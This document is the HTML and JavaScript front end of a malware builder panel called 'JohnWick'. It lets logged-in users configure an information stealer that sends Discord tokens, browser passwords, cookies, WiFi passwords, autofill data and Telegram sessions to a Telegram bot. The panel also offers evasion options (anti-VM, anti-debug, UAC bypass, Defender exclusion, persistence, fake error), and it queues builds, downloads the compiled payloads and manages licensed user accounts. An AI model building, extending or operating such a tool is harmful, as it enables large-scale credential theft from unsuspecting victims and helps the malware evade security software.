<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>JohnWick</title>
<style>
  *{box-sizing:border-box}
  body{background:#0b0d10;color:#d7dae0;font:14px/1.5 system-ui;margin:0;padding:0;min-height:100vh}
  .wrap{max-width:1120px;margin:0 auto;padding:26px 22px 60px}
  .brand{text-align:center;font-weight:900;letter-spacing:.16em;font-size:38px;color:#f06292;
    text-shadow:0 0 14px rgba(240,98,146,.45);margin:8px 0 4px;
    font-family:"Arial Black",system-ui,sans-serif}
  .card{border:1px solid #22262d;border-radius:12px;padding:18px 20px;margin-bottom:16px;background:#0f1216}
  .card h3{margin:0 0 14px;color:#f06292;font-size:12px;text-transform:uppercase;letter-spacing:.08em;font-weight:700}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:12px}
  .chk{display:flex;gap:9px;align-items:center;font-size:13px;color:#c3c8d0;cursor:pointer}
  .chk input{width:16px;height:16px;accent-color:#f06292;cursor:pointer}
  input[type=text],input[type=password],input[type=number]{width:100%;background:#12151a;border:1px solid #22262d;
    color:#e8eaed;padding:11px 12px;border-radius:9px;font:inherit}
  input:focus{outline:none;border-color:#f06292}
  label.fld{display:block;font-size:11px;color:#8b93a1;text-transform:uppercase;letter-spacing:.05em;margin:0 0 6px;font-weight:600}
  button{background:#f06292;color:#0b0d10;border:0;padding:11px 20px;border-radius:9px;font:inherit;
    font-weight:800;cursor:pointer;letter-spacing:.04em}
  button.sec{background:#1b1f26;color:#d7dae0;border:1px solid #2a2f38}
  button.danger{background:#e5484d;color:#fff}
  .btnbig{width:100%;padding:18px;font-size:15px;letter-spacing:.16em;border-radius:12px;margin-top:6px}
  .row{display:flex;gap:12px;align-items:end;flex-wrap:wrap}
  .grow{flex:1;min-width:180px}
  .nav{display:flex;gap:8px;margin:6px 0 20px}
  .nav a{padding:8px 16px;border-radius:9px;background:#12151a;border:1px solid #22262d;color:#c3c8d0;cursor:pointer;font-size:13px}
  .nav a.on{background:#f06292;color:#0b0d10;border-color:#f06292;font-weight:800}
  table{width:100%;border-collapse:collapse;font-size:13px}
  th,td{text-align:left;padding:10px;border-bottom:1px solid #1c2027}
  th{color:#8b93a1;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.05em}
  .pill{padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700}
  .pill.done{background:#12351f;color:#3fb950}.pill.building{background:#2a2410;color:#e3b341}
  .pill.queued{background:#1a1d24;color:#8b93a1}.pill.failed{background:#3a1416;color:#f85149}
  .muted{color:#6b7280;font-size:12px}.topbar{display:flex;justify-content:space-between;align-items:center}
  .err{color:#f85149;background:#201113;border:1px solid #3a1416;padding:11px 13px;border-radius:9px;margin-bottom:14px}
  .ok{color:#3fb950;background:#0f2016;border:1px solid #12351f;padding:11px 13px;border-radius:9px;margin-bottom:14px}
  .status{font-size:12px;color:#8b93a1;margin:2px 0 16px}.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f06292;margin-right:7px}
  .stepper{display:flex;align-items:center;gap:10px}.stepper button{width:42px;padding:10px 0;background:#1b1f26;color:#d7dae0;border:1px solid #2a2f38;font-size:18px}
  .hidden{display:none}
  .loginbox{max-width:400px;margin:60px auto}
  a{color:#f06292;text-decoration:none}
</style></head>
<body>
<div class="wrap">
  <div class="brand">JOHNWICK</div>

  <!-- LOGIN -->
  <div id="loginView" class="loginbox hidden">
    <div id="loginMsg"></div>
    <div class="card">
      <label class="fld">Username</label><input id="lu" type="text" autocomplete="username">
      <div style="height:12px"></div>
      <label class="fld">Password</label><input id="lp" type="password" autocomplete="current-password">
    </div>
    <button class="btnbig" onclick="doLogin()">SIGN IN</button>
  </div>

  <!-- APP -->
  <div id="appView" class="hidden">
    <div class="topbar">
      <div class="nav">
        <a id="tabBuild" class="on" onclick="showTab('build')">Build</a>
        <a id="tabUsers" class="hidden" onclick="showTab('users')">Users</a>
      </div>
      <div class="muted"><span id="whoami"></span> &nbsp; <a onclick="logout()">sign out</a></div>
    </div>

    <!-- BUILD TAB -->
    <div id="buildTab">
      <div id="buildMsg"></div>
      <div class="status"><span class="dot"></span>ready to build</div>

      <div class="card">
        <h3>Destination Configuration</h3>
        <label class="fld">Telegram bot token</label>
        <input id="bot_token" type="text" placeholder="123456789:AA...">
        <div style="height:12px"></div>
        <div class="row">
          <div class="grow"><label class="fld">Chat ID</label><input id="chat_id" type="text" placeholder="6698930447"></div>
          <div class="grow"><label class="fld">Output name</label><input id="name" type="text" value="SearchHost"></div>
        </div>
        <div style="height:12px"></div>
        <div class="row">
          <div class="grow"><label class="fld">Licence key (optional)</label><input id="licence_key" type="text" placeholder="blank = your own build"></div>
          <div class="grow"><label class="fld">Licence server URL (optional)</label><input id="licence_url" type="text" placeholder="https://you.netlify.app/api/license"></div>
        </div>
      </div>

      <div class="card"><h3>Stealer Options</h3><div class="grid" id="stealGrid"></div></div>

      <div class="card">
        <h3>Malware Options</h3><div class="grid" id="optGrid"></div>
        <div style="height:14px"></div>
        <label class="fld">Error text (with Fake Error)</label><input id="error_text" type="text" placeholder="...">
        <div style="height:12px"></div>
        <label class="fld">Startup delay (sec)</label>
        <div class="stepper"><button onclick="stepDelay(-1)">-</button><input id="startup_delay" type="number" value="0" min="0" style="max-width:120px"><button onclick="stepDelay(1)">+</button></div>
      </div>

      <button class="btnbig" onclick="submitBuild()">BUILD</button>

      <div class="card" style="margin-top:22px"><h3>Your builds</h3><div id="buildList" class="muted">loading...</div></div>
    </div>

    <!-- USERS TAB (admin) -->
    <div id="usersTab" class="hidden">
      <div id="usersMsg"></div>
      <div class="card">
        <h3>Add user</h3>
        <div class="row">
          <div class="grow"><label class="fld">Username</label><input id="nu" type="text"></div>
          <div class="grow"><label class="fld">Password</label><input id="np" type="text"></div>
          <div class="grow"><label class="fld">Role</label>
            <select id="nrole" style="width:100%;background:#12151a;border:1px solid #22262d;color:#e8eaed;padding:11px;border-radius:9px">
              <option value="user">user</option><option value="admin">admin</option></select></div>
          <button onclick="addUser()">Add</button>
        </div>
      </div>
      <div class="card"><h3>Accounts</h3><div id="userList" class="muted">loading...</div></div>
    </div>
  </div>
</div>

<script src="config.js"></script>
<script>
const API = window.JWG_API || "https://YOUR-WORKER.workers.dev";
const STEAL = [["system_info","System Info"],["discord","Discord Tokens"],["passwords","Passwords"],
  ["cookies","Cookies"],["history","History"],["wifi","WiFi Passwords"],["roblox","Roblox Cookies"],
  ["screenshot","Screenshot"],["autofill","Autofill Data"],["extensions","Extensions"],
  ["product_keys","Product Keys"],["software_list","Software List"],["telegram","Telegram Sessions"]];
const OPTS = [["anti_vm","Anti VM"],["anti_debug","Anti Debug"],["anti_analysis","Anti Analysis"],
  ["uac_bypass","UAC Bypass"],["startup","Startup"],["kill_browsers","Kill Browsers"],
  ["self_destruct","Self-Destruct"],["defender_exclusion","Defender Exclusion"],["fake_error","Fake Error"]];
const DEFAULT_ON = new Set(["system_info","discord","passwords","cookies","wifi","roblox","screenshot",
  "autofill","extensions","product_keys","software_list","telegram"]);
let TOKEN = localStorage.getItem("jwg_tok") || null;
let ME = null;

async function api(path, opts={}) {
  const r = await fetch(API+path, { ...opts, headers: {
    "content-type":"application/json", ...(TOKEN?{authorization:"Bearer "+TOKEN}:{}) }});
  if (r.status===401){ logout(); throw new Error("session expired"); }
  return r.json();
}
function msg(el, text, kind="ok"){ document.getElementById(el).innerHTML =
  text ? `<div class="${kind}">${text}</div>` : ""; }

function renderToggles(){
  document.getElementById("stealGrid").innerHTML = STEAL.map(([k,l])=>
    `<label class="chk"><input type="checkbox" data-st="${k}" ${DEFAULT_ON.has(k)?"checked":""}>${l}</label>`).join("");
  document.getElementById("optGrid").innerHTML = OPTS.map(([k,l])=>
    `<label class="chk"><input type="checkbox" data-mo="${k}">${l}</label>`).join("");
}
function stepDelay(d){ const el=document.getElementById("startup_delay"); el.value=Math.max(0,(parseInt(el.value)||0)+d); }

async function doLogin(){
  msg("loginMsg","");
  try{
    const d = await api("/api/login",{method:"POST",body:JSON.stringify({u:document.getElementById("lu").value,p:document.getElementById("lp").value})});
    if(!d.ok) throw new Error(d.error||"login failed");
    TOKEN=d.token; localStorage.setItem("jwg_tok",TOKEN); ME=d.user; enterApp();
  }catch(e){ msg("loginMsg",e.message,"err"); }
}
function logout(){ localStorage.removeItem("jwg_tok"); TOKEN=null; location.reload(); }

function showTab(t){
  document.getElementById("buildTab").classList.toggle("hidden", t!=="build");
  document.getElementById("usersTab").classList.toggle("hidden", t!=="users");
  document.getElementById("tabBuild").classList.toggle("on", t==="build");
  document.getElementById("tabUsers").classList.toggle("on", t==="users");
  if(t==="users") loadUsers(); else loadBuilds();
}
function enterApp(){
  document.getElementById("loginView").classList.add("hidden");
  document.getElementById("appView").classList.remove("hidden");
  document.getElementById("whoami").textContent = ME.username+" · "+ME.role;
  if(ME.role==="admin") document.getElementById("tabUsers").classList.remove("hidden");
  renderToggles(); loadBuilds();
}

async function submitBuild(){
  msg("buildMsg","");
  const steal={}, opts={};
  document.querySelectorAll("[data-st]").forEach(c=>steal[c.dataset.st]=c.checked);
  document.querySelectorAll("[data-mo]").forEach(c=>opts[c.dataset.mo]=c.checked);
  opts.startup_delay=parseInt(document.getElementById("startup_delay").value)||0;
  opts.error_text=document.getElementById("error_text").value;
  const body={ bot_token:val("bot_token"), chat_id:val("chat_id"), name:val("name"),
    licence_key:val("licence_key"), licence_url:val("licence_url"), steal, opts };
  try{
    const d=await api("/api/build",{method:"POST",body:JSON.stringify(body)});
    if(!d.ok) throw new Error(d.error||"failed");
    msg("buildMsg","queued: "+d.build.config.name+" — waiting for a runner to compile it","ok");
    document.getElementById("bot_token").value="";   // never keep the token in the field
    loadBuilds();
  }catch(e){ msg("buildMsg",e.message,"err"); }
}
const val=id=>document.getElementById(id).value.trim();

async function loadBuilds(){
  const el=document.getElementById("buildList");
  try{
    const d=await api("/api/builds"); const rows=d.builds||[];
    if(!rows.length){ el.innerHTML='<span class="muted">none yet.</span>'; return; }
    el.innerHTML="<table><tr><th>name</th><th>dest</th><th>status</th><th></th></tr>"+
      rows.map(b=>`<tr><td>${b.name}</td><td class="muted">...${(b.chat_id||"").slice(-4)}</td>
        <td><span class="pill ${b.status}">${b.status}</span>${b.error?`<div class=muted>${b.error}</div>`:""}</td>
        <td class=row>${b.status==="done"?`<a href="#" onclick="dl('${b.id}');return false;">download</a>`:""}
        <button class="danger" style="padding:5px 12px;font-size:12px" onclick="delBuild('${b.id}')">delete</button></td></tr>`).join("")+"</table>";
    setTimeout(loadBuilds, 4000);   // poll while queued/building
  }catch(e){ el.innerHTML=`<span class=err>${e.message}</span>`; }
}
async function delBuild(id){
  if(!confirm("delete this build and its artifact?")) return;
  try{ const d=await api(`/api/builds/${id}`,{method:"DELETE"}); if(!d.ok) throw new Error(d.error||"failed"); loadBuilds(); }
  catch(e){ msg("buildMsg", e.message, "err"); }
}
async function dl(id){   // fetch with auth header, then trigger blob download.
  try{
    const r=await fetch(`${API}/api/builds/${id}/download`,{headers:{authorization:"Bearer "+TOKEN}});
    if(!r.ok) throw new Error("artifact gone, expired, or not yours (HTTP "+r.status+")");
    const cd=r.headers.get("content-disposition")||"";
    const m=cd.match(/filename="?([^"]+)"?/); const fname=m?m[1]:(id+".zip");
    const blob=await r.blob(); const url=URL.createObjectURL(blob);
    const a=document.createElement("a"); a.href=url; a.download=fname; document.body.appendChild(a); a.click();
    a.remove(); setTimeout(()=>URL.revokeObjectURL(url),2000);
  }catch(e){ alert(e.message); }
}

async function loadUsers(){
  const el=document.getElementById("userList");
  const d=await api("/api/users"); const rows=d.users||[];
  el.innerHTML="<table><tr><th>user</th><th>role</th><th>state</th><th>actions</th></tr>"+
    rows.map(u=>`<tr><td>${u.username}</td><td class="muted">${u.role}</td>
      <td><span class="pill ${u.disabled?"failed":"done"}">${u.disabled?"disabled":"active"}</span></td>
      <td class="row">${u.id!==ME.id?
        `<button class="sec" onclick="userAction('${u.id}','${u.disabled?"enable":"disable"}')">${u.disabled?"enable":"disable"}</button>
         <button class="danger" onclick="delUser('${u.id}')">delete</button>`:`<span class=muted>you</span>`}</td></tr>`).join("")+"</table>";
}
async function addUser(){
  msg("usersMsg","");
  try{ const d=await api("/api/users",{method:"POST",body:JSON.stringify({username:val("nu"),password:val("np"),role:document.getElementById("nrole").value})});
    if(!d.ok) throw new Error(d.error); msg("usersMsg","added "+d.user.username,"ok"); val("nu");loadUsers();
  }catch(e){ msg("usersMsg",e.message,"err"); }
}
async function userAction(id,action){ await api(`/api/users/${id}`,{method:"POST",body:JSON.stringify({action})}); loadUsers(); }
async function delUser(id){ if(!confirm("delete user?"))return; await api(`/api/users/${id}`,{method:"DELETE"}); loadUsers(); }

(async function boot(){
  if(TOKEN){ try{ const d=await api("/api/me"); if(d.ok){ ME=d.user; enterApp(); return; } }catch{} }
  document.getElementById("loginView").classList.remove("hidden");
})();
</script>
</body></html>
